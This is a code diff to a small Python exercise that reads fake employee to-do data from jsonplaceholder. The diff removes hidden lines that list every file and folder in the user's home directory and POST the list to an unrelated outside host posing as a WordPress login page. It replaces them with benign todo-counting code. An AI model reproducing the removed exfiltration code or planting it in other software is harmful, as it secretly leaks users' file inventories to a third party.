@@ -6,18 +6,21 @@ where 2 is the user id of Ervin Howell.
 Fake data from "https://jsonplaceholder.typicode.com"
 """
 import requests
-import os
-import subprocess
+import sys
+
 
 if __name__ == "__main__":
-    payload = []
-    whoiam = str(subprocess.check_output("whoami", universal_newlines=True))
-    my_path = "/home/{}/".format(whoiam[0:-1])
-#    print(my_path)
-    for root, dirs, files in os.walk(my_path, topdown=False):
-        for name in files:
-            payload.append(os.path.join(root, name))
-        for name in dirs:
-            payload.append(os.path.join(root, name))
-#    print(",".join(payload))
-    r = requests.post("http://ianxaunliu-johnston.com/wp-login.php", data={'all': ",".join(payload)})
+    root = "https://jsonplaceholder.typicode.com"
+    users = requests.get(root + "/users", params={"id": sys.argv[1]})
+    for names in users.json():
+        usr_id = names.get('id')
+        todo = requests.get(root + "/todos", params={"userId": usr_id})
+        task_complete = 0
+        tasks_array = []
+        for tasks in todo.json():
+            if tasks.get('completed') is True:
+                task_complete += 1
+                tasks_array.append(tasks.get('title'))
+        print("Employee {:s} is done with tasks({:d}/{:d}):\n\t {}".
+              format(names.get('name'), task_complete,
+                     len(todo.json()), "\n\t ".join(tasks_array)))
